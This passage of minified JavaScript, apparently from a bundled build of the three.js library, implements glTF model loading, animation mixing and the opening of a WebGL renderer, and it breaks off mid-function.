0!==a.occlusionTexture.strength&&(o.aoMapIntensity=a.occlusionTexture.strength)),void 0!==a.emissiveFactor&&e!==Si&&(o.emissive=(new be).fromArray(a.emissiveFactor)),void 0!==a.emissiveTexture&&e!==Si&&l.push(this.assignTexture(o,"emissiveMap",a.emissiveTexture)),Promise.all(l).then((function(){var t;return t=e===bi?r[i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS].createMaterial(o):new e(o),void 0!==a.name&&(t.name=a.name),t.map&&(t.map.encoding=qt),t.emissiveMap&&(t.emissiveMap.encoding=qt),t.specularMap&&(t.specularMap.encoding=qt),S(t,a),a.extensions&&T(r,t,a),t}))},P.prototype.loadGeometries=function(t){var e,n=this,r=this.extensions,a=this.primitiveCache,o=function(t){if(t.length<2)return!1;var e=t[0],n=e.targets||[];if(void 0===e.indices)return!1;for(var r=1,a=t.length;r<a;r++){var o=t[r];if(e.mode!==o.mode)return!1;if(void 0===o.indices)return!1;if(o.extensions&&o.extensions[i.KHR_DRACO_MESH_COMPRESSION])return!1;if(!E(e.attributes,o.attributes))return!1;var s=o.targets||[];if(n.length!==s.length)return!1;for(var l=0,c=n.length;l<c;l++)if(!E(n[l],s[l]))return!1}return!0}(t);function s(t){return r[i.KHR_DRACO_MESH_COMPRESSION].decodePrimitive(t,n).then((function(e){return O(e,t,n)}))}o&&(e=t,t=[t[0]]);for(var l=[],c=0,h=t.length;c<h;c++){var u,d=t[c],p=L(d),f=a[p];f?l.push(f.promise):(u=d.extensions&&d.extensions[i.KHR_DRACO_MESH_COMPRESSION]?s(d):O(new ii,d,n),a[p]={primitive:d,promise:u},l.push(u))}return Promise.all(l).then((function(i){if(o){var r=i[0],a=n.multiPassGeometryCache,s=function(t,e){for(var i=t.uuid,n=0,r=e.length;n<r;n++)i+=n+L(e[n]);return i}(r,e);if(null!==(p=a[s]))return[p.geometry];var l=new ii;for(var c in l.name=r.name,l.userData=r.userData,r.attributes)l.addAttribute(c,r.attributes[c]);for(var c in r.morphAttributes)l.morphAttributes[c]=r.morphAttributes[c];for(var h=[],u=0,d=e.length;u<d;u++)h.push(n.getDependency("accessor",e[u].indices));return Promise.all(h).then((function(t){for(var i=[],n=0,o=0,c=e.length;o<c;o++){for(var h=t[o],u=0,d=h.count;u<d;u++)i.push(h.array[u]);l.addGroup(n,h.count,o),n+=h.count}return l.setIndex(i),a[s]={geometry:l,baseGeometry:r,primitives:e},[l]}))}if(i.length>1&&void 0!==za){for(u=1,d=t.length;u<d;u++)if(t[0].mode!==t[u].mode)return i;var p;if(a=n.multiplePrimitivesCache,s=function(t){for(var e="",i=0,n=t.length;i<n;i++)e+=":"+t[i].uuid;return e}(i),p=a[s]){if(null!==p.geometry)return[p.geometry]}else if(l=za.mergeBufferGeometries(i,!0),a[s]={geometry:l,baseGeometries:i},null!==l)return[l]}return i}))},P.prototype.loadMesh=function(t){for(var e=this,n=this.json,r=this.extensions,a=n.meshes[t],o=a.primitives,s=[],l=0,c=o.length;l<c;l++){var h=void 0===o[l].material?new Ar({color:16777215,emissive:0,metalness:1,roughness:1,transparent:!1,depthTest:!0,side:0}):this.getDependency("material",o[l].material);s.push(h)}return Promise.all(s).then((function(n){return e.loadGeometries(o).then((function(s){for(var l=1===s.length&&s[0].groups.length>0,c=[],h=0,u=s.length;h<u;h++){var d,p=s[h],f=o[h],m=l?n:n[h];if(4===f.mode||5===f.mode||6===f.mode||void 0===f.mode)!0===(d=!0===a.isSkinnedMesh?new Cr(p,m):new Mi(p,m)).isSkinnedMesh&&d.normalizeSkinWeights(),5===f.mode?d.drawMode=1:6===f.mode&&(d.drawMode=2);else if(1===f.mode)d=new Fr(p,m);else if(3===f.mode)d=new Ir(p,m);else if(2===f.mode)d=new Nr(p,m);else{if(0!==f.mode)throw new Error("GLTFLoader: Primitive mode unsupported: "+f.mode);d=new Dr(p,m)}Object.keys(d.geometry.morphAttributes).length>0&&M(d,a),d.name=a.name||"mesh_"+t,s.length>1&&(d.name+="_"+h),S(d,a),c.push(d);for(var _=l?d.material:[d.material],g=void 0!==p.attributes.tangent,v=void 0!==p.attributes.color,y=void 0===p.attributes.normal,x=!0===d.isSkinnedMesh,b=Object.keys(p.morphAttributes).length>0,w=b&&void 0!==p.morphAttributes.normal,T=0,E=_.length;T<E;T++){if(m=_[T],d.isPoints){var L="PointsMaterial:"+m.uuid,k=e.cache.get(L);k||(k=new zr,li.prototype.copy.call(k,m),k.color.copy(m.color),k.map=m.map,k.lights=!1,e.cache.add(L,k)),m=k}else if(d.isLine){L="LineBasicMaterial:"+m.uuid;var A=e.cache.get(L);A||(A=new Rr,li.prototype.copy.call(A,m),A.color.copy(m.color),A.lights=!1,e.cache.add(L,A)),m=A}if(g||v||y||x||b){L="ClonedMaterial:"+m.uuid+":",m.isGLTFSpecularGlossinessMaterial&&(L+="specular-glossiness:"),x&&(L+="skinning:"),g&&(L+="vertex-tangents:"),v&&(L+="vertex-colors:"),y&&(L+="flat-shading:"),b&&(L+="morph-targets:"),w&&(L+="morph-normals:");var P=e.cache.get(L);P||(P=m.isGLTFSpecularGlossinessMaterial?r[i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS].cloneMaterial(m):m.clone(),x&&(P.skinning=!0),g&&(P.vertexTangents=!0),v&&(P.vertexColors=2),y&&(P.flatShading=!0),b&&(P.morphTargets=!0),w&&(P.morphNormals=!0),e.cache.add(L,P)),m=P}_[T]=m,m.aoMap&&void 0===p.attributes.uv2&&void 0!==p.attributes.uv&&p.addAttribute("uv2",new We(p.attributes.uv.array,2)),m.isGLTFSpecularGlossinessMaterial&&(d.onBeforeRender=r[i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS].refreshUniforms)}d.material=l?_:_[0]}if(1===c.length)return c[0];var O=new or;for(h=0,u=c.length;h<u;h++)O.add(c[h]);return O}))}))},P.prototype.loadCamera=function(t){var e,i=this.json.cameras[t],n=i[i.type];if(n)return"perspective"===i.type?e=new ar(Zt.radToDeg(n.yfov),n.aspectRatio||1,n.znear||1,n.zfar||2e6):"orthographic"===i.type&&(e=new rr(n.xmag/-2,n.xmag/2,n.ymag/2,n.ymag/-2,n.znear,n.zfar)),void 0!==i.name&&(e.name=i.name),S(e,i),Promise.resolve(e)},P.prototype.loadSkin=function(t){var e=this.json.skins[t],i={joints:e.joints};return void 0===e.inverseBindMatrices?Promise.resolve(i):this.getDependency("accessor",e.inverseBindMatrices).then((function(t){return i.inverseBindMatrices=t,i}))},P.prototype.loadAnimation=function(t){for(var e=this.json.animations[t],i=[],n=[],r=[],a=[],o=[],s=0,l=e.channels.length;s<l;s++){var c=e.channels[s],h=e.samplers[c.sampler],u=c.target,d=void 0!==u.node?u.node:u.id,f=void 0!==e.parameters?e.parameters[h.input]:h.input,m=void 0!==e.parameters?e.parameters[h.output]:h.output;i.push(this.getDependency("node",d)),n.push(this.getDependency("accessor",f)),r.push(this.getDependency("accessor",m)),a.push(h),o.push(u)}return Promise.all([Promise.all(i),Promise.all(n),Promise.all(r),Promise.all(a),Promise.all(o)]).then((function(i){for(var n=i[0],r=i[1],a=i[2],o=i[3],s=i[4],l=[],c=0,h=n.length;c<h;c++){var u=n[c],d=r[c],f=a[c],m=o[c],_=s[c];if(void 0!==u){var g;switch(u.updateMatrix(),u.matrixAutoUpdate=!0,y[_.path]){case y.weights:g=Jr;break;case y.rotation:g=ta;break;case y.position:case y.scale:default:g=ia}var v=u.name?u.name:u.uuid,b=void 0!==m.interpolation?x[m.interpolation]:2301,w=[];y[_.path]===y.weights?u.traverse((function(t){!0===t.isMesh&&t.morphTargetInfluences&&w.push(t.name?t.name:t.uuid)})):w.push(v);for(var T=0,S=w.length;T<S;T++){var M=new g(w[T]+"."+y[_.path],Vr.arraySlice(d.array,0),Vr.arraySlice(f.array,0),b);"CUBICSPLINE"===m.interpolation&&(M.createInterpolant=function(t){return new p(this.times,this.values,this.getValueSize()/3,t)},M.createInterpolant.isInterpolantFactoryMethodGLTFCubicSpline=!0),l.push(M)}}}return new na(void 0!==e.name?e.name:"animation_"+t,void 0,l)}))},P.prototype.loadNode=function(t){var e=this.json,n=this.extensions,r=this,a=e.meshReferences,o=e.meshUses,s=e.nodes[t];return(!0===s.isBone?Promise.resolve(new aa):void 0!==s.mesh?r.getDependency("mesh",s.mesh).then((function(t){var e;if(a[s.mesh]>1){var i=o[s.mesh]++;(e=t.clone()).name+="_instance_"+i,e.onBeforeRender=t.onBeforeRender;for(var n=0,r=e.children.length;n<r;n++)e.children[n].name+="_instance_"+i,e.children[n].onBeforeRender=t.children[n].onBeforeRender}else e=t;return void 0!==s.weights&&e.traverse((function(t){if(t.isMesh)for(var e=0,i=s.weights.length;e<i;e++)t.morphTargetInfluences[e]=s.weights[e]})),e})):void 0!==s.camera?r.getDependency("camera",s.camera):s.extensions&&s.extensions[i.KHR_LIGHTS_PUNCTUAL]&&void 0!==s.extensions[i.KHR_LIGHTS_PUNCTUAL].light?r.getDependency("light",s.extensions[i.KHR_LIGHTS_PUNCTUAL].light):Promise.resolve(new De)).then((function(t){if(void 0!==s.name&&(t.name=Ca.sanitizeNodeName(s.name)),S(t,s),s.extensions&&T(n,t,s),void 0!==s.matrix){var e=new Qt;e.fromArray(s.matrix),t.applyMatrix(e)}else void 0!==s.translation&&t.position.fromArray(s.translation),void 0!==s.rotation&&t.quaternion.fromArray(s.rotation),void 0!==s.scale&&t.scale.fromArray(s.scale);return t}))},P.prototype.loadScene=function(){function t(e,i,n,r){var a=n.nodes[e];return r.getDependency("node",e).then((function(t){return void 0===a.skin?t:r.getDependency("skin",a.skin).then((function(t){for(var i=[],n=0,a=(e=t).joints.length;n<a;n++)i.push(r.getDependency("node",e.joints[n]));return Promise.all(i)})).then((function(i){for(var n=!0===t.isGroup?t.children:[t],r=0,a=n.length;r<a;r++){for(var o=n[r],s=[],l=[],c=0,h=i.length;c<h;c++){var u=i[c];if(u){s.push(u);var d=new Qt;void 0!==e.inverseBindMatrices&&d.fromArray(e.inverseBindMatrices.array,16*c),l.push(d)}}o.bind(new oa(s,l),o.matrixWorld)}return t}));var e})).then((function(e){i.add(e);var o=[];if(a.children)for(var s=a.children,l=0,c=s.length;l<c;l++){var h=s[l];o.push(t(h,e,n,r))}return Promise.all(o)}))}return function(e){var i=this.json,n=this.extensions,r=this.json.scenes[e],a=new ir;void 0!==r.name&&(a.name=r.name),S(a,r),r.extensions&&T(n,a,r);for(var o=r.nodes||[],s=[],l=0,c=o.length;l<c;l++)s.push(t(o[l],a,i,this));return Promise.all(s).then((function(){return a}))}}(),t}();function Ga(t,e){wr.call(this,t,e),this.type="AmbientLight",this.castShadow=void 0}function Ua(t,e,i){this._mixer=t,this._clip=e,this._localRoot=i||null;for(var n=e.tracks,r=n.length,a=new Array(r),o={endingStart:Xt,endingEnd:Xt},s=0;s!==r;++s){var l=n[s].createInterpolant(null);a[s]=l,l.settings=o}this._interpolantSettings=o,this._interpolants=a,this._propertyBindings=new Array(r),this._cacheIndex=null,this._byClipCacheIndex=null,this._timeScaleInterpolant=null,this._weightInterpolant=null,this.loop=2201,this._loopCount=-1,this._startTime=null,this.time=0,this.timeScale=1,this._effectiveTimeScale=1,this.weight=1,this._effectiveWeight=1,this.repetitions=1/0,this.paused=!1,this.enabled=!0,this.clampWhenFinished=!1,this.zeroSlopeAtStart=!0,this.zeroSlopeAtEnd=!0}function Ba(t,e,i){this.binding=t,this.valueSize=i;var n,r=Float64Array;switch(e){case"quaternion":n=this._slerp;break;case"string":case"bool":r=Array,n=this._select;break;default:n=this._lerp}this.buffer=new r(4*i),this._mixBufferRegion=n,this.cumulativeWeight=0,this.useCount=0,this.referenceCount=0}function ja(t){this._root=t,this._initMemoryManager(),this._accuIndex=0,this.time=0,this.timeScale=1}function Wa(t,e){var i=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),i.push.apply(i,n)}return i}function Ha(t){for(var e=1;e<arguments.length;e++){var i=null!=arguments[e]?arguments[e]:{};e%2?Wa(i,!0).forEach((function(e){Object(n.a)(t,e,i[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(i)):Wa(i).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(i,e))}))}return t}Ga.prototype=Object.assign(Object.create(wr.prototype),{constructor:Ga,isAmbientLight:!0}),i(240),Object.assign(Ua.prototype,{play:function(){return this._mixer._activateAction(this),this},stop:function(){return this._mixer._deactivateAction(this),this.reset()},reset:function(){return this.paused=!1,this.enabled=!0,this.time=0,this._loopCount=-1,this._startTime=null,this.stopFading().stopWarping()},isRunning:function(){return this.enabled&&!this.paused&&0!==this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)},isScheduled:function(){return this._mixer._isActiveAction(this)},startAt:function(t){return this._startTime=t,this},setLoop:function(t,e){return this.loop=t,this.repetitions=e,this},setEffectiveWeight:function(t){return this.weight=t,this._effectiveWeight=this.enabled?t:0,this.stopFading()},getEffectiveWeight:function(){return this._effectiveWeight},fadeIn:function(t){return this._scheduleFading(t,0,1)},fadeOut:function(t){return this._scheduleFading(t,1,0)},crossFadeFrom:function(t,e,i){if(t.fadeOut(e),this.fadeIn(e),i){var n=this._clip.duration,r=t._clip.duration,a=r/n,o=n/r;t.warp(1,a,e),this.warp(o,1,e)}return this},crossFadeTo:function(t,e,i){return t.crossFadeFrom(this,e,i)},stopFading:function(){var t=this._weightInterpolant;return null!==t&&(this._weightInterpolant=null,this._mixer._takeBackControlInterpolant(t)),this},setEffectiveTimeScale:function(t){return this.timeScale=t,this._effectiveTimeScale=this.paused?0:t,this.stopWarping()},getEffectiveTimeScale:function(){return this._effectiveTimeScale},setDuration:function(t){return this.timeScale=this._clip.duration/t,this.stopWarping()},syncWith:function(t){return this.time=t.time,this.timeScale=t.timeScale,this.stopWarping()},halt:function(t){return this.warp(this._effectiveTimeScale,0,t)},warp:function(t,e,i){var n=this._mixer,r=n.time,a=this._timeScaleInterpolant,o=this.timeScale;null===a&&(a=n._lendControlInterpolant(),this._timeScaleInterpolant=a);var s=a.parameterPositions,l=a.sampleValues;return s[0]=r,s[1]=r+i,l[0]=t/o,l[1]=e/o,this},stopWarping:function(){var t=this._timeScaleInterpolant;return null!==t&&(this._timeScaleInterpolant=null,this._mixer._takeBackControlInterpolant(t)),this},getMixer:function(){return this._mixer},getClip:function(){return this._clip},getRoot:function(){return this._localRoot||this._mixer._root},_update:function(t,e,i,n){if(this.enabled){var r=this._startTime;if(null!==r){var a=(t-r)*i;if(a<0||0===i)return;this._startTime=null,e=i*a}e*=this._updateTimeScale(t);var o=this._updateTime(e),s=this._updateWeight(t);if(s>0)for(var l=this._interpolants,c=this._propertyBindings,h=0,u=l.length;h!==u;++h)l[h].evaluate(o),c[h].accumulate(n,s)}else this._updateWeight(t)},_updateWeight:function(t){var e=0;if(this.enabled){e=this.weight;var i=this._weightInterpolant;if(null!==i){var n=i.evaluate(t)[0];e*=n,t>i.parameterPositions[1]&&(this.stopFading(),0===n&&(this.enabled=!1))}}return this._effectiveWeight=e,e},_updateTimeScale:function(t){var e=0;if(!this.paused){e=this.timeScale;var i=this._timeScaleInterpolant;null!==i&&(e*=i.evaluate(t)[0],t>i.parameterPositions[1]&&(this.stopWarping(),0===e?this.paused=!0:this.timeScale=e))}return this._effectiveTimeScale=e,e},_updateTime:function(t){var e=this.time+t,i=this._clip.duration,n=this.loop,r=this._loopCount,a=2202===n;if(0===t)return-1===r?e:a&&1==(1&r)?i-e:e;if(2200===n){-1===r&&(this._loopCount=0,this._setEndings(!0,!0,!1));t:{if(e>=i)e=i;else{if(!(e<0))break t;e=0}this.clampWhenFinished?this.paused=!0:this.enabled=!1,this._mixer.dispatchEvent({type:"finished",action:this,direction:t<0?-1:1})}}else{if(-1===r&&(t>=0?(r=0,this._setEndings(!0,0===this.repetitions,a)):this._setEndings(0===this.repetitions,!0,a)),e>=i||e<0){var o=Math.floor(e/i);e-=i*o,r+=Math.abs(o);var s=this.repetitions-r;if(s<=0)this.clampWhenFinished?this.paused=!0:this.enabled=!1,e=t>0?i:0,this._mixer.dispatchEvent({type:"finished",action:this,direction:t>0?1:-1});else{if(1===s){var l=t<0;this._setEndings(l,!l,a)}else this._setEndings(!1,!1,a);this._loopCount=r,this._mixer.dispatchEvent({type:"loop",action:this,loopDelta:o})}}if(a&&1==(1&r))return this.time=e,i-e}return this.time=e,e},_setEndings:function(t,e,i){var n=this._interpolantSettings;i?(n.endingStart=2401,n.endingEnd=2401):(n.endingStart=t?this.zeroSlopeAtStart?2401:Xt:2402,n.endingEnd=e?this.zeroSlopeAtEnd?2401:Xt:2402)},_scheduleFading:function(t,e,i){var n=this._mixer,r=n.time,a=this._weightInterpolant;null===a&&(a=n._lendControlInterpolant(),this._weightInterpolant=a);var o=a.parameterPositions,s=a.sampleValues;return o[0]=r,s[0]=e,o[1]=r+t,s[1]=i,this}}),Object.assign(Ba.prototype,{accumulate:function(t,e){var i=this.buffer,n=this.valueSize,r=t*n+n,a=this.cumulativeWeight;if(0===a){for(var o=0;o!==n;++o)i[r+o]=i[o];a=e}else{var s=e/(a+=e);this._mixBufferRegion(i,r,0,s,n)}this.cumulativeWeight=a},apply:function(t){var e=this.valueSize,i=this.buffer,n=t*e+e,r=this.cumulativeWeight,a=this.binding;if(this.cumulativeWeight=0,r<1){var o=3*e;this._mixBufferRegion(i,n,o,1-r,e)}for(var s=e,l=e+e;s!==l;++s)if(i[s]!==i[s+e]){a.setValue(i,n);break}},saveOriginalState:function(){var t=this.binding,e=this.buffer,i=this.valueSize,n=3*i;t.getValue(e,n);for(var r=i,a=n;r!==a;++r)e[r]=e[n+r%i];this.cumulativeWeight=0},restoreOriginalState:function(){var t=3*this.valueSize;this.binding.setValue(this.buffer,t)},_select:function(t,e,i,n,r){if(n>=.5)for(var a=0;a!==r;++a)t[e+a]=t[i+a]},_slerp:function(t,e,i,n){te.slerpFlat(t,e,t,e,t,i,n)},_lerp:function(t,e,i,n,r){for(var a=1-n,o=0;o!==r;++o){var s=e+o;t[s]=t[s]*a+t[i+o]*n}}}),ja.prototype=Object.assign(Object.create(Kt.prototype),{constructor:ja,_bindAction:function(t,e){var i=t._localRoot||this._root,n=t._clip.tracks,r=n.length,a=t._propertyBindings,o=t._interpolants,s=i.uuid,l=this._bindingsByRootAndName,c=l[s];void 0===c&&(c={},l[s]=c);for(var h=0;h!==r;++h){var u=n[h],d=u.name,p=c[d];if(void 0!==p)a[h]=p;else{if(void 0!==(p=a[h])){null===p._cacheIndex&&(++p.referenceCount,this._addInactiveBinding(p,s,d));continue}var f=e&&e._propertyBindings[h].binding.parsedPath;++(p=new Ba(Ca.create(i,d,f),u.ValueTypeName,u.getValueSize())).referenceCount,this._addInactiveBinding(p,s,d),a[h]=p}o[h].resultBuffer=p.buffer}},_activateAction:function(t){if(!this._isActiveAction(t)){if(null===t._cacheIndex){var e=(t._localRoot||this._root).uuid,i=t._clip.uuid,n=this._actionsByClip[i];this._bindAction(t,n&&n.knownActions[0]),this._addInactiveAction(t,i,e)}for(var r=t._propertyBindings,a=0,o=r.length;a!==o;++a){var s=r[a];0==s.useCount++&&(this._lendBinding(s),s.saveOriginalState())}this._lendAction(t)}},_deactivateAction:function(t){if(this._isActiveAction(t)){for(var e=t._propertyBindings,i=0,n=e.length;i!==n;++i){var r=e[i];0==--r.useCount&&(r.restoreOriginalState(),this._takeBackBinding(r))}this._takeBackAction(t)}},_initMemoryManager:function(){this._actions=[],this._nActiveActions=0,this._actionsByClip={},this._bindings=[],this._nActiveBindings=0,this._bindingsByRootAndName={},this._controlInterpolants=[],this._nActiveControlInterpolants=0;var t=this;this.stats={actions:{get total(){return t._actions.length},get inUse(){return t._nActiveActions}},bindings:{get total(){return t._bindings.length},get inUse(){return t._nActiveBindings}},controlInterpolants:{get total(){return t._controlInterpolants.length},get inUse(){return t._nActiveControlInterpolants}}}},_isActiveAction:function(t){var e=t._cacheIndex;return null!==e&&e<this._nActiveActions},_addInactiveAction:function(t,e,i){var n=this._actions,r=this._actionsByClip,a=r[e];if(void 0===a)a={knownActions:[t],actionByRoot:{}},t._byClipCacheIndex=0,r[e]=a;else{var o=a.knownActions;t._byClipCacheIndex=o.length,o.push(t)}t._cacheIndex=n.length,n.push(t),a.actionByRoot[i]=t},_removeInactiveAction:function(t){var e=this._actions,i=e[e.length-1],n=t._cacheIndex;i._cacheIndex=n,e[n]=i,e.pop(),t._cacheIndex=null;var r=t._clip.uuid,a=this._actionsByClip,o=a[r],s=o.knownActions,l=s[s.length-1],c=t._byClipCacheIndex;l._byClipCacheIndex=c,s[c]=l,s.pop(),t._byClipCacheIndex=null,delete o.actionByRoot[(t._localRoot||this._root).uuid],0===s.length&&delete a[r],this._removeInactiveBindingsForAction(t)},_removeInactiveBindingsForAction:function(t){for(var e=t._propertyBindings,i=0,n=e.length;i!==n;++i){var r=e[i];0==--r.referenceCount&&this._removeInactiveBinding(r)}},_lendAction:function(t){var e=this._actions,i=t._cacheIndex,n=this._nActiveActions++,r=e[n];t._cacheIndex=n,e[n]=t,r._cacheIndex=i,e[i]=r},_takeBackAction:function(t){var e=this._actions,i=t._cacheIndex,n=--this._nActiveActions,r=e[n];t._cacheIndex=n,e[n]=t,r._cacheIndex=i,e[i]=r},_addInactiveBinding:function(t,e,i){var n=this._bindingsByRootAndName,r=n[e],a=this._bindings;void 0===r&&(r={},n[e]=r),r[i]=t,t._cacheIndex=a.length,a.push(t)},_removeInactiveBinding:function(t){var e=this._bindings,i=t.binding,n=i.rootNode.uuid,r=i.path,a=this._bindingsByRootAndName,o=a[n],s=e[e.length-1],l=t._cacheIndex;s._cacheIndex=l,e[l]=s,e.pop(),delete o[r];t:{for(var c in o)break t;delete a[n]}},_lendBinding:function(t){var e=this._bindings,i=t._cacheIndex,n=this._nActiveBindings++,r=e[n];t._cacheIndex=n,e[n]=t,r._cacheIndex=i,e[i]=r},_takeBackBinding:function(t){var e=this._bindings,i=t._cacheIndex,n=--this._nActiveBindings,r=e[n];t._cacheIndex=n,e[n]=t,r._cacheIndex=i,e[i]=r},_lendControlInterpolant:function(){var t=this._controlInterpolants,e=this._nActiveControlInterpolants++,i=t[e];return void 0===i&&((i=new Xr(new Float32Array(2),new Float32Array(2),1,this._controlInterpolantsResultBuffer)).__cacheIndex=e,t[e]=i),i},_takeBackControlInterpolant:function(t){var e=this._controlInterpolants,i=t.__cacheIndex,n=--this._nActiveControlInterpolants,r=e[n];t.__cacheIndex=n,e[n]=t,r.__cacheIndex=i,e[i]=r},_controlInterpolantsResultBuffer:new Float32Array(1),clipAction:function(t,e){var i=e||this._root,n=i.uuid,r="string"==typeof t?na.findByName(i,t):t,a=null!==r?r.uuid:t,o=this._actionsByClip[a],s=null;if(void 0!==o){var l=o.actionByRoot[n];if(void 0!==l)return l;s=o.knownActions[0],null===r&&(r=s._clip)}if(null===r)return null;var c=new Ua(this,r,e);return this._bindAction(c,s),this._addInactiveAction(c,a,n),c},existingAction:function(t,e){var i=e||this._root,n=i.uuid,r="string"==typeof t?na.findByName(i,t):t,a=r?r.uuid:t,o=this._actionsByClip[a];return void 0!==o&&o.actionByRoot[n]||null},stopAllAction:function(){var t=this._actions,e=this._nActiveActions,i=this._bindings,n=this._nActiveBindings;this._nActiveActions=0,this._nActiveBindings=0;for(var r=0;r!==e;++r)t[r].reset();for(r=0;r!==n;++r)i[r].useCount=0;return this},update:function(t){t*=this.timeScale;for(var e=this._actions,i=this._nActiveActions,n=this.time+=t,r=Math.sign(t),a=this._accuIndex^=1,o=0;o!==i;++o)e[o]._update(n,t,r,a);var s=this._bindings,l=this._nActiveBindings;for(o=0;o!==l;++o)s[o].apply(a);return this},getRoot:function(){return this._root},uncacheClip:function(t){var e=this._actions,i=t.uuid,n=this._actionsByClip,r=n[i];if(void 0!==r){for(var a=r.knownActions,o=0,s=a.length;o!==s;++o){var l=a[o];this._deactivateAction(l);var c=l._cacheIndex,h=e[e.length-1];l._cacheIndex=null,l._byClipCacheIndex=null,h._cacheIndex=c,e[c]=h,e.pop(),this._removeInactiveBindingsForAction(l)}delete n[i]}},uncacheRoot:function(t){var e=t.uuid,i=this._actionsByClip;for(var n in i){var r=i[n].actionByRoot[e];void 0!==r&&(this._deactivateAction(r),this._removeInactiveAction(r))}var a=this._bindingsByRootAndName[e];if(void 0!==a)for(var o in a){var s=a[o];s.restoreOriginalState(),this._removeInactiveBinding(s)}},uncacheAction:function(t,e){var i=this.existingAction(t,e);null!==i&&(this._deactivateAction(i),this._removeInactiveAction(i))}}),window.THREE={WebGLRenderer:function(t){var e=void 0!==(t=t||{}).canvas?t.canvas:document.createElementNS("http://www.w3.org/1999/xhtml","canvas"),i=void 0!==t.context?t.context:null,n=void 0!==t.alpha&&t.alpha,r=void 0===t.depth||t.depth,a=void 0===t.stencil||t.stencil,o=void 0!==t.antialias&&t.antialias,s=void 0===t.premultipliedAlpha||t.premultipliedAlpha,l=void 0!==t.preserveDrawingBuffer&&t.preserveDrawingBuffer,c=void 0!==t.powerPreference?t.powerPreference:"default",h=null,u=null;this.domElement=e,this.context=null,this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this.gammaFactor=2,this.gammaInput=!1,this.gammaOutput=!1,this.physicallyCorrectLights=!1,this.toneMapping=1,this.toneMappingExposure=1,this.toneMappingWhitePoint=1,this.maxMorphTargets=8,this.maxMorphNormals=4;var d,p,f,m,_,g,v,y,x,b,w,T,S,M,E,L,k,A,P,O=this,C=!1,R=null,I=null,F=null,N=-1,z={geometry:null,program:null,wireframe:!1},D=null,G=null,U=new ke,B=new ke,j=null,W=0,H=e.width,V=e.height,Y=1,X=new ke(0,0,H,V),$=new ke(0,0,H,V),q=!1,Z=new me,K=new Qt,J=new ee;function Q(){return null===I?Y:1}try{var tt={alpha:n,depth:r,stencil:a,antialias:o,premultipliedAlpha:s,preserveDrawingBuffer:l,powerPreference:c};if(e.addEventListener("webglcontextlost",it,!1),e.addEventListener("webglcontextrestored",nt,!1),null===(d=i||e.getContext("webgl",tt)||e.getContext("experimental-webgl",tt)))throw null!==e.getContext("webgl")?new Error("Error creating WebGL context with your selected attributes."):new Error("Error creating WebGL context.");void 0===d.getShaderPrecisionFormat&&(d.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}})}catch(t){throw t}function et(){p=new Ai(d),(f=new ki(d,p,t)).isWebGL2||(p.get("WEBGL_depth_texture"),p.get("OES_texture_float"),p.get("OES_texture_half_float"),p.get("OES_texture_half_float_linear"),p.get("OES_standard_derivatives"),p.get("OES_element_index_uint"),p.get("ANGLE_instanced_arrays")),p.get("OES_texture_float_linear"),A=new Qn(d,p,f),(m=new Kn(d,p,A,f)).scissor(B.copy($).multiplyScalar(Y)),m.viewport(U.copy(X).multiplyScalar(Y)),_=new Ci(d),g=new Bn,v=new Jn(d,p,m,g,f,A,_),y=new Ae(d),x=new Pi(d,y,_),b=new Fi(x,_),E=new Ii(d),w=new Un(O,p,f),T=new Vn,S=new Zn,M=new Ei(O,m,b,s),L=new Li(d,p,_,f),k=new Oi(d,p,_,f),_.programs=w.programs,O.context=d,O.capabilities=f,O.extensions=p,O.properties=g,O.renderLists=T,O.state=m,O.info=_}function it(t){t.preventDefault(),C=!0}function nt(){C=!1,et()}function rt(t){var e=t.target;e.removeEventListener("dispose",rt),function(t){at(t),g.remove(t)}(e)}function at(t){var e=g.get(t).program;t.program=void 0,void 0!==e&&w.releaseProgram(e)}function ot(t,e,i,n){if(!1!==t.visible){if(t.layers.test(e.layers))if(t.isGroup)i=t.renderOrder;else if(t.isLight)u.pushLight(t),t.castShadow&&u.pushShadow(t);else if(t.isSprite){if(!t.frustumCulled||Z.intersectsSprite(t)){n&&J.setFromMatrixPosition(t.matrixWorld).applyMatrix4(K);var r=b.update(t),a=t.material;h.push(t,r,a,i,J.z,null)}}else if(t.isImmediateRenderObject)n&&J.setFromMatrixPosition(t.matrixWorld).applyMatrix4(K),h.push(t,null,t.material,i,J.z,null);else if((t.isMesh||t.isLine||t.isPoints)&&(t.isSkinnedMesh&&t.skeleton.update(),!t.frustumCulled||Z.intersectsObject(t)))if(n&&J.setFromMatrixPosition(t.matrixWorld).applyMatrix4(K),r=b.update(t),a=t.material,Array.isArray(a))for(var o=r.groups,s=0,l=o.length;s<l;s++){var c=o[s],d=a[c.materialIndex];d&&d.visible&&h.push(t,r,d,i,J.z,c)}else a.visible&&h.push(t,r,a,i,J.z,null);var p=t.children;for(s=0,l=p.length;s<l;s++)ot(p[s],e,i,n)}}function st(t,e,i,n){for(var r=0,a=t.length;r<a;r++){var o=t[r],s=o.object,l=o.geometry,c=void 0===n?o.material:n,h=o.group;if(i.isArrayCamera){G=i;for(var d=i.cameras,p=0,f=d.length;p<f;p++){var _=d[p];if(s.layers.test(_.layers)){if("viewport"in _)m.viewport(U.copy(_.viewport));else{var g=_.bounds,v=g.x*H,y=g.y*V,x=g.z*H,b=g.w*V;m.viewport(U.set(v,y,x,b).multiplyScalar(Y))}u.setupLights(_),lt(s,e,_,l,c,h)}}}else G=null,lt(s,e,i,l,c,h)}}function lt(t,e,i,n,r,a){if(t.onBeforeRender(O,e,i,n,r,a),u=S.get(e,G||i),t.modelViewMatrix.multiplyMatrices(i.matrixWorldInverse,t.matrixWorld),t.normalMatrix.getNormalMatrix(t.modelViewMatrix),t.isImmediateRenderObject){m.setMaterial(r);var 